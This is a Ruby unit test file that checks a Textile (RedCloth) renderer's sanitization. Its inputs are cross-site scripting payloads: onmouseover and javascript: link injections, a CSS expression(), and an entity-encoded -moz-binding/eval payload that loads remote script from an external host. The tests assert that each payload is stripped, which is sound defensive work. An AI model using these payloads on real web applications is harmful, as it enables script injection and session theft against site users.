#  Copyright 2020 ThoughtWorks, Inc.
#  
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU Affero General Public License as
#  published by the Free Software Foundation, either version 3 of the
#  License, or (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU Affero General Public License for more details.
#  
#  You should have received a copy of the GNU Affero General Public License
#  along with this program.  If not, see <https://www.gnu.org/licenses/agpl-3.0.txt>.

require File.expand_path('../../../unit_test_helper', File.dirname(__FILE__))
require File.expand_path('../../renderable_test_helper', File.dirname(__FILE__))

class Renderable::RedClothTest < ActiveSupport::TestCase
  include RenderableTestHelper::Unit

  def setup
    login_as_member
    @project = renderable_test_project
    @project.activate
  end

  #when this test failed, it's good to know the bug is gone and please remove this test
  def test_redcloth_bug
    textile = %q{

      <div id="div1">
{{ dummy: xxx}}
      </div>

      <div id="div2">
{{ dummy: yyy }}
      </div>
    }

    expected = %q{<p><div id="div1">
{{ dummy: xxx}}
      </div>
{{ dummy: yyy }}
      </div></p>


<div id="div2">}

    assert_equal expected, textile.apply_redcloth
  end

  def test_should_not_allow_color_css_injection_via_closing_style_tag
    card = card_with_redcloth_content('%{color:red" onmouseover="alert(1)"}text%')
    assert_equal '<span style="color: red;">text</span>', card.formatted_content(self)
  end

  def test_should_not_allow_color_css_injection_via_style_attributes
    card = card_with_redcloth_content('%{background-image:expression(alert(\'xss\'))}text%')
    assert_equal '<span style="">text</span>', card.formatted_content(self)
  end

  def test_should_allow_acceptable_css_attributes
    card = card_with_redcloth_content('%{color:red}text%')
    assert_equal '<span style="color: red;">text</span>', card.formatted_content(self)
  end

  def test_apply_red_cloth_to_string
    assert_equal '<p><span style="color:red;">text</span></p>', '%{color:red}text%'.apply_redcloth
  end

  def test_should_not_escape_and_char
    assert_equal '<p>&</p>', '&'.apply_redcloth
  end

  def test_should_not_allow_css_injection
    card = card_with_redcloth_content( 'p{\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss);&#x78&#x78&#x3A&#x20&#x65&#x5C&#x78&#x70&#x5C&#x72&#x65&#x5C&#x73&#x5C&#x73&#x5C&#x69&#x5C&#x6F&#x5C&#x6E&#x28&#x28&#x77&#x69&#x6E&#x64&#x6F&#x77&#x2E&#x72&#x21&#x3D&#x31&#x29&#x20&#x3F&#x20&#x65&#x76&#x61&#x6C&#x28&#x27&#x78&#x3D&#x53&#x74&#x72&#x69&#x6E&#x67&#x2E&#x66&#x72&#x6F&#x6D&#x43&#x68&#x61&#x72&#x43&#x6F&#x64&#x65&#x3B&#x73&#x63&#x72&#x3D&#x64&#x6F&#x63&#x75&#x6D&#x65&#x6E&#x74&#x2E&#x63&#x72&#x65&#x61&#x74&#x65&#x45&#x6C&#x65&#x6D&#x65&#x6E&#x74&#x28&#x78&#x28&#x31&#x31&#x35&#x2C&#x39&#x39&#x2C&#x31&#x31&#x34&#x2C&#x31&#x30&#x35&#x2C&#x31&#x31&#x32&#x2C&#x31&#x31&#x36&#x29&#x29&#x3B&#x73&#x63&#x72&#x2E&#x73&#x65&#x74&#x41&#x74&#x74&#x72&#x69&#x62&#x75&#x74&#x65&#x28&#x78&#x28&#x31&#x31&#x35&#x2C&#x31&#x31&#x34&#x2C&#x39&#x39&#x29&#x2C&#x78&#x28&#x31&#x30&#x34&#x2C&#x31&#x31&#x36&#x2C&#x31&#x31&#x36&#x2C&#x31&#x31&#x32&#x2C&#x35&#x38&#x2C&#x34&#x37&#x2C&#x34&#x37&#x2C&#x39&#x38&#x2C&#x31&#x31&#x37&#x2C&#x31&#x31&#x35&#x2C&#x31&#x30&#x35&#x2C&#x31&#x31&#x30&#x2C&#x31&#x30&#x31&#x2C&#x31&#x31&#x35&#x2C&#x31&#x31&#x35&#x2C&#x31&#x30&#x35&#x2C&#x31&#x31&#x30&#x2C&#x31&#x30&#x32&#x2C&#x31&#x31&#x31&#x2C&#x34&#x36&#x2C&#x39&#x39&#x2C&#x31&#x31&#x31&#x2C&#x34&#x36&#x2C&#x31&#x31&#x37&#x2C&#x31&#x30&#x37&#x2C&#x34&#x37&#x2C&#x31&#x30&#x38&#x2C&#x39&#x37&#x2C&#x39&#x38&#x2C&#x31&#x31&#x35&#x2C&#x34&#x37&#x2C&#x31&#x32&#x30&#x2C&#x31&#x31&#x35&#x2C&#x31&#x31&#x35&#x2C&#x34&#x37&#x2C&#x31&#x32&#x30&#x2C&#x31&#x31&#x35&#x2C&#x31&#x31&#x35&#x2C&#x34&#x36&#x2C&#x31&#x30&#x36&#x2C&#x31&#x31&#x35&#x29&#x29&#x3B&#x64&#x6F&#x63&#x75&#x6D&#x65&#x6E&#x74&#x2E&#x67&#x65&#x74&#x45&#x6C&#x65&#x6D&#x65&#x6E&#x74&#x42&#x79&#x49&#x64&#x28&#x78&#x28&#x20&#x31&#x30&#x35&#x2C&#x31&#x31&#x30&#x2C&#x31&#x30&#x36&#x2C&#x31&#x30&#x31&#x2C&#x39&#x39&#x2C&#x31&#x31&#x36&#x20&#x29&#x29&#x2E&#x61&#x70&#x70&#x65&#x6E&#x64&#x43&#x68&#x69&#x6C&#x64&#x28&#x73&#x63&#x72&#x29&#x3B&#x77&#x69&#x6E&#x64&#x6F&#x77&#x2E&#x72&#x3D&#x31&#x3B&#x27&#x29 : 1);}. text')
    assert_equal "<p style=\"\">text</p>", card.formatted_content(self)
  end

  def test_javascript_injection_via_redcloth_image_link_attributes
    content = %q{!http://www.w3.org/Icons/valid-html401(This page is valid HTML" onmouseover=javascript:document.bodies")!}
    card = card_with_redcloth_content(content)
    assert_dom_equal "<img title=\"This page is valid HTML\" src=\"http://www.w3.org/Icons/valid-html401\" alt=\"This page is valid HTML\" />", card.formatted_content(self)
  end

  def test_javascript_injection_via_redcloth_links
    content = %q{"CLICK ME FOR CANDY!!!!!!!!!!!!!!!!!!":javascript:alert('xsscandy');}
    card = card_with_redcloth_content(content)
    assert_dom_equal "<a>CLICK ME FOR CANDY!!!!!!!!!!!!!!!!!!</a>", card.formatted_content(self)
  end

  def test_javascript_injection_via_redcloth_image_links
    content = %q{!openwindow1.gif!:javascript:alert('xss');}
    card = card_with_redcloth_content(content)
    assert_dom_equal "<a><img src=\"openwindow1.gif\" alt=\"!openwindow1.gif!\" /></a>", card.formatted_content(self)
  end

  def test_apply_inline_link_only
    content = '"Google":http://www.google.com'
    assert_equal "<a href=\"http://www.google.com\">Google</a>", content.apply_redcloth(:lite_mode => true, :rules => [:inline_textile_link])
  end
end
